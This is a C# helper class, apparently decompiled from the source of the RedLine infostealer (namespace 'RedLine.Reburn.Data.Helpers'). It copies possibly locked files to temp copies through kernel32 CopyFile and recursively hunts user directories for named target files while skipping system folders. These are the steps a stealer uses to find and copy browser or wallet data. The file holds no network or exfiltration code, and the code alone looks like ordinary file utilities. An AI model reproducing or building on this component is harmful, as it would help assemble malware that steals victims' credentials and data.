using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace RedLine.Reburn.Data.Helpers;

public static class FileSystemHelper
{
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

	public static string TryCreateTemp(string filePath, out bool createdNew)
	{
		string empty = string.Empty;
		try
		{
			empty = Path.GetTempFileName();
			if (CopyToTemp(filePath, empty))
			{
				createdNew = true;
				return empty;
			}
			CloseLock(filePath);
			if (CopyToTemp(filePath, empty))
			{
				createdNew = true;
				return empty;
			}
			createdNew = false;
			return filePath;
		}
		catch
		{
			createdNew = false;
			return filePath;
		}
	}

	public static bool CopyToTemp(string filePath, string temp)
	{
		try
		{
			return CopyFile(filePath, temp, bFailIfExists: false);
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void CloseLock(string filePath)
	{
	}

	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		list.Add("\\Windows\\");
		list.Add("\\Program Files\\");
		list.Add("\\Program Files (x86)\\");
		list.Add("\\Program Data\\");
		List<string> list2 = new List<string>();
		if (files != null && files.Length != 0 && level <= maxLevel)
		{
			try
			{
				string[] directories = Directory.GetDirectories(baseDirectory);
				foreach (string text in directories)
				{
					bool flag = false;
					foreach (string item in list)
					{
						if (text.Contains(item))
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(text);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag2 = false;
							for (int j = 0; j < files2.Length; j++)
							{
								if (flag2)
								{
									break;
								}
								for (int k = 0; k < files.Length; k++)
								{
									if (flag2)
									{
										break;
									}
									string obj = files[k];
									FileInfo fileInfo = files2[j];
									if (obj == fileInfo.Name)
									{
										flag2 = true;
										list2.Add(fileInfo.FullName);
									}
								}
							}
							foreach (string item2 in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								if (!list2.Contains(item2))
								{
									list2.Add(item2);
								}
							}
							directoryInfo = null;
						}
						catch
						{
						}
					}
				}
				return list2;
			}
			catch
			{
				return list2;
			}
		}
		return list2;
	}
}
